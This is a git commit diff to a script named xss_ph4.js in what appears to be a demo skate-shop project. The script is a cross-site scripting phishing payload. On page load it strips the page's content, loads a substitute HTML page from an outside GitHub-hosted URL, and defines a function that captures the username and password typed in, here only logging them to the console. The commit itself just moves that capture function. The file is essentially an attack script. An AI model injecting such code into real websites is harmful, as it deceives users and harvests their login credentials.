96f904aac71c20d6742092dd453748a11986879f
Tom <hot@microsoft.com>
2020-08-24 15:23:10 +0800

    ph4

--- SkateShop/xss_ph4.js
+++ SkateShop/xss_ph4.js
@@ -6,14 +6,14 @@ var place_holder = document.createElement('div');
 place_holder.className = "place_holder";
 $("nav").after(place_holder);
 
+function xxsSubmit(username, password) {
+    console.log("Username is: " + username);
+    console.log("Password is: " + password);
+}
+
 $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
     $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html");
     console.log("done");
 });
-
-function xxsSubmit(username, password) {
-    console.log("Username is: " + username);
-    console.log("Password is: " + password);
-}
